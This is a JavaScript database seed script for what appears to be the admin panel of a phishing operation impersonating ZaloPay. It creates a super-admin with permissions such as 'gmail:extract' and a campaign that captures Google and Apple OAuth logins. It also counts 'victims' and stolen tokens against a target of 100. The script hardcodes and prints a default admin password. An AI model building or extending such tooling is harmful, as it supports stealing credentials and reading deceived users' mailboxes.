const { PrismaClient } = require('@prisma/client');
const bcrypt = require('bcryptjs');

const prisma = new PrismaClient();

async function main() {
  console.log('🌱 Starting database seed...');

  // Create default admin user
  const adminPassword = process.env.ADMIN_PASSWORD || 'admin123';
  const hashedPassword = await bcrypt.hash(adminPassword, 10);

  const adminUser = await prisma.adminUser.upsert({
    where: { username: 'admin' },
    update: {},
    create: {
      username: 'admin',
      email: 'admin@zalopay.local',
      passwordHash: hashedPassword,
      role: 'super_admin',
      permissions: [
        'victims:read',
        'victims:write',
        'victims:delete',
        'campaigns:read',
        'campaigns:write',
        'campaigns:delete',
        'gmail:access',
        'gmail:extract',
        'activity:read',
        'dashboard:read',
        'admin:manage',
      ],
      accessRestrictions: {},
      mfaConfig: {},
      sessionConfig: {
        maxSessionDuration: 3600,
        idleTimeout: 1800,
      },
      activitySummary: {
        totalLogins: 0,
        lastLogin: null,
        totalActions: 0,
      },
      securityFlags: {},
      adminMetadata: {
        createdBy: 'system',
        notes: 'Default admin user created during seed',
      },
      isActive: true,
    },
  });

  console.log('✅ Admin user created:', adminUser.username);

  // Create default campaign
  const defaultCampaign = await prisma.campaign.upsert({
    where: { code: 'DEFAULT-2024' },
    update: {},
    create: {
      name: 'Default Campaign 2024',
      code: 'DEFAULT-2024',
      description: 'Default campaign for initial setup',
      config: {
        oauthProviders: ['google', 'apple'],
        captureMethods: ['oauth_google', 'oauth_apple', 'form_direct'],
        redirectUrl: '/register.html',
        successUrl: '/success.html',
      },
      infrastructure: {
        domains: [],
        servers: [],
        cdn: [],
      },
      timeline: {
        startDate: new Date().toISOString(),
        endDate: null,
        milestones: [],
      },
      statistics: {
        totalVictims: 0,
        totalOAuthTokens: 0,
        registrationCompleted: 0,
        registrationRate: '0.00',
      },
      successCriteria: {
        targetVictims: 100,
        targetRegistrationRate: 0.5,
      },
      riskAssessment: {
        level: 'low',
        factors: [],
      },
      team: {
        members: [],
        roles: {},
      },
      status: 'active',
      statusHistory: [
        {
          status: 'active',
          timestamp: new Date().toISOString(),
          changedBy: adminUser.id,
        },
      ],
      createdBy: adminUser.id,
    },
  });

  console.log('✅ Default campaign created:', defaultCampaign.code);

  // Verify all tables exist
  const tables = [
    'victims',
    'oauth_tokens',
    'admin_users',
    'campaigns',
    'activity_logs',
    'gmail_access_logs',
    'devices',
    'device_data',
  ];

  console.log('\n📊 Verifying database schema...');
  for (const table of tables) {
    try {
      const result = await prisma.$queryRawUnsafe(
        `SELECT COUNT(*) as count FROM information_schema.tables WHERE table_name = '${table}'`
      );
      if (result && result.length > 0 && result[0].count > 0) {
        console.log(`  ✓ Table ${table} exists`);
      } else {
        console.log(`  ⚠ Table ${table} not found (may need migration)`);
      }
    } catch (error) {
      console.error(`  ✗ Table ${table} check failed:`, error.message);
    }
  }

  console.log('\n✨ Seed completed successfully!');
  console.log('\n📝 Default credentials:');
  console.log('  Username: admin');
  console.log(`  Password: ${adminPassword}`);
  console.log('  Email: admin@zalopay.local');
}

main()
  .catch((e) => {
    console.error('❌ Seed failed:', e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });

